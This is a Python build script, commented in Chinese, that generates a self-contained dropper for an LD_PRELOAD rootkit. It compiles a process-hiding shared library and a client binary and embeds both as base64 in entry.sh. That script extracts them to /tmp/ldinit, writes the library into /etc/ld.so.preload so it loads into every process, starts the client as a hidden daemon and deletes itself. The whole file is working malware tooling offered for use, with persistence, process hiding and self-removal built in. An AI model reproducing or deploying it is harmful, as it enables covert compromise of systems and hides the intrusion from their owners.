#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
compile.py —— LD_PRELOAD rootkit 一键构建 + 投放脚本生成

输入:
    ../preload_c/preload.c
    ../client_cpp/Makefile + 源码
输出:
    ../preload_c/libprocesshider.so
    ../client_cpp/client
    ./entry.sh   (自包含投放脚本)

entry.sh 执行后行为:
    1) 把内嵌的 base64 blob 还原成 libprocesshider.so / client
       释放到 /tmp/ldinit/
    2) 把 /tmp/ldinit/libprocesshider.so 写入 /etc/ld.so.preload
       (idempotent: grep 去重,不会重复加)
    3) 后台启动 /tmp/ldinit/client (client 自身 daemonize)
    4) rm -f "$0" 自删除
"""

import base64
import os
import stat
import subprocess
import sys
from pathlib import Path

# ---------- 路径 ----------
ROOT       = Path(__file__).resolve().parent
PRELOAD_C  = ROOT.parent / "preload_c" / "preload.c"
PRELOAD_SO = ROOT.parent / "preload_c" / "libprocesshider.so"
CPP_DIR    = ROOT.parent / "client_cpp"
CPP_BIN    = CPP_DIR / "client"
ENTRY      = ROOT / "entry.sh"

DST_DIR    = "/tmp/ldinit"           # 运行时释放目录
LIB_NAME   = "libprocesshider.so"    # .so 文件名

# ---------- helpers ----------

def info(msg: str) -> None:
    print(f"[compile.py] {msg}", flush=True)

def run(cmd, cwd=None):
    info("$ " + " ".join(str(x) for x in cmd)
         + (f"   (cwd={cwd})" if cwd else ""))
    r = subprocess.run(cmd, cwd=cwd)
    if r.returncode != 0:
        sys.exit(f"[!] failed (rc={r.returncode}): {' '.join(map(str, cmd))}")

# ---------- 构建步骤 ----------

def build_preload() -> bytes:
    if not PRELOAD_C.exists():
        sys.exit(f"[!] not found: {PRELOAD_C}")
    cc = os.environ.get("CC", "gcc")
    run([cc, "-shared", "-fPIC", "-nostartfiles",
         str(PRELOAD_C), "-o", str(PRELOAD_SO), "-ldl"])
    return PRELOAD_SO.read_bytes()

def build_client() -> bytes:
    mk = CPP_DIR / "Makefile"
    if not mk.exists():
        sys.exit(f"[!] not found: {mk}")
    make = os.environ.get("MAKE", "make")
    run([make], cwd=str(CPP_DIR))
    if not CPP_BIN.exists():
        sys.exit(f"[!] build OK but binary missing: {CPP_BIN}")
    return CPP_BIN.read_bytes()

# ---------- entry.sh 生成 ----------

def b64(b: bytes) -> str:
    """base64 + 76 列换行(heredoc 友好),保证末尾有 \\n"""
    s = base64.encodebytes(b).decode()
    if not s.endswith("\n"):
        s += "\n"
    return s

def write_entry(so_bytes: bytes, cli_bytes: bytes) -> None:
    so_b64  = b64(so_bytes)
    cli_b64 = b64(cli_bytes)

    template = f"""#!/bin/sh
# =============================================================
#  entry.sh —— LD_PRELOAD rootkit 一键投放
#  由 compile.py 自动生成,请勿手改
# =============================================================
set -e

DST='{DST_DIR}'
LIB="$DST/{LIB_NAME}"
CLI="$DST/client"

# ---------- 1) 还原产物到文件系统 ----------
mkdir -p "$DST"

base64 -d > "$LIB" <<'__BLOB_SO__'
{so_b64}__BLOB_SO__

base64 -d > "$CLI" <<'__BLOB_CLI__'
{cli_b64}__BLOB_CLI__

chmod 0755 "$LIB" "$CLI"

# ---------- 2) 劫持 /etc/ld.so.preload ----------
# grep 去重,已有相同条目就跳过
if ! grep -qF "$LIB" /etc/ld.so.preload 2>/dev/null; then
    if ! echo "$LIB" >> /etc/ld.so.preload 2>/dev/null; then
        echo "[entry.sh] warn: cannot write /etc/ld.so.preload (need root?)"
    fi
fi

# ---------- 3) 跑 client(自身会 daemonize,后台即可) ----------
cd "$DST"
./client >/dev/null 2>&1 &

# ---------- 4) 自删除 ----------
rm -f "$0"
"""
    ENTRY.write_text(template)
    # 加可执行位
    mode = ENTRY.stat().st_mode
    ENTRY.chmod(mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)
    info(f"wrote {ENTRY}   ({ENTRY.stat().st_size} bytes, "
         f"so={len(so_bytes)} cli={len(cli_bytes)})")

# ---------- main ----------

def main() -> None:
    info(f"root   : {ROOT}")
    info(f"preload: {PRELOAD_C}")
    info(f"client : {CPP_DIR}/Makefile")

    info("step 1/3  build libprocesshider.so")
    so = build_preload()
    info(f"          -> {PRELOAD_SO} ({len(so)} bytes)")

    info("step 2/3  build client")
    cli = build_client()
    info(f"          -> {CPP_BIN} ({len(cli)} bytes)")

    info("step 3/3  generate entry.sh")
    write_entry(so, cli)

    info("=== done ===")
    info(f"运行 : sudo sh {ENTRY}    # 需要 root 才能写 /etc/ld.so.preload")
    info(f"清理 : sudo rm -rf {DST_DIR} /etc/ld.so.preload")

if __name__ == "__main__":
    main()
